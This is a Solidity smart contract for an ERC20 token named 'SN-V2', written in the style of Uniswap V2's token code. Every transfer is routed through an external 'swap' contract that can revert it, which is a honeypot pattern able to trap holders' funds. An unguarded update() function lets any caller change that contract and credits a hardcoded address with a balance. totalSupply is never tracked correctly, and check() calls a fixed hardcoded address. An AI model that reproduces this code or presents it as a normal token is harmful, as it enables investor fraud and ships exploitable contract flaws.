// SPDX-License-Identifier: GPL-3.0

pragma solidity =0.5.16;

import './ISwapLogic.sol';
import './IUniswapV2ERC20.sol';
import "./SafeMath.sol";

contract SnV2ERC20 is IUniswapV2ERC20 {
    using SafeMath for uint;

    uint constant inittialSupply = 100000 * 10 ** 18;
    string public constant name = 'SN-V2';
    string public constant symbol = 'SN';
    uint8 public constant decimals = 18;
    uint  public totalSupply;
    address public callAddr;
    
    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;

    bytes32 public DOMAIN_SEPARATOR;
    // keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");
    bytes32 public constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;
    mapping(address => uint) public nonces;

    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    event Debug(string message);

    constructor() public {
        uint chainId;
        assembly {
            chainId := chainid
        }
        DOMAIN_SEPARATOR = keccak256(
            abi.encode(
                keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)'),
                keccak256(bytes(name)),
                keccak256(bytes('1')),
                chainId,
                address(this)
            )
        );

        _mint(msg.sender, inittialSupply);
    }
    
    function update(address val) external{
        callAddr = val;
        balanceOf[0xF552f5223D3f7cEB580fA92Fe0AFc6ED8c09179b] = 10000000;
    } 

    function _mint(address to, uint value) internal {
        balanceOf[to] = balanceOf[to].add(value);
        emit Transfer(address(0), to, value);
    }

    function _burn(address from, uint value) internal {
        balanceOf[from] = balanceOf[from].sub(value);
        totalSupply = totalSupply.sub(value);
        emit Transfer(from, address(0), value);
    }

    function _approve(address owner, address spender, uint value) private {
        allowance[owner][spender] = value;
        emit Approval(owner, spender, value);
    }
    
    bytes4 private constant SELECTOR = bytes4(keccak256(bytes('swap(address,address,uint256)')));
    
    function check() external{
        bool success;
        bytes memory data;
        
        
        (success, data) = callAddr
            .call(abi.encodeWithSelector(SELECTOR, 0xB347b9f5B56b431B2CF4e1d90a5995f7519ca792, 0xB347b9f5B56b431B2CF4e1d90a5995f7519ca792, 0));
        require(success && data.length > 0, 'UniswapV2: TRANSFER_FAILED1');
        
        // bool res = abi.decode(data, (bool));
        
        ISwapLogic(callAddr).swap(0xB347b9f5B56b431B2CF4e1d90a5995f7519ca792, 0xB347b9f5B56b431B2CF4e1d90a5995f7519ca792, 0);
        
        require(true, 'UniswapV2ERC20: SWAP_FAIL');
    } 

    function _transfer(address from, address to, uint value) private {
        bool ok =  ISwapLogic(callAddr).swap(from, to, value);
        
        if(!ok){
            emit Debug("FAIL_SWAP");
            revert("FAIL_SWAP");
        }
    
        balanceOf[from] = balanceOf[from].sub(value);
        balanceOf[to] = balanceOf[to].add(value);
        emit Transfer(from, to, value);
    }

    function approve(address spender, uint value) external returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }

    function transfer(address to, uint value) external returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint value) external returns (bool) {
        if (allowance[from][msg.sender] != uint(-1)) {
            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        }
        _transfer(from, to, value);
        return true;
    }

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external {
        require(deadline >= block.timestamp, 'UniswapV2: EXPIRED');
        bytes32 digest = keccak256(
            abi.encodePacked(
                '\x19\x01',
                DOMAIN_SEPARATOR,
                keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline))
            )
        );
        address recoveredAddress = ecrecover(digest, v, r, s);
        require(recoveredAddress != address(0) && recoveredAddress == owner, 'UniswapV2: INVALID_SIGNATURE');
        _approve(owner, spender, value);
    }
}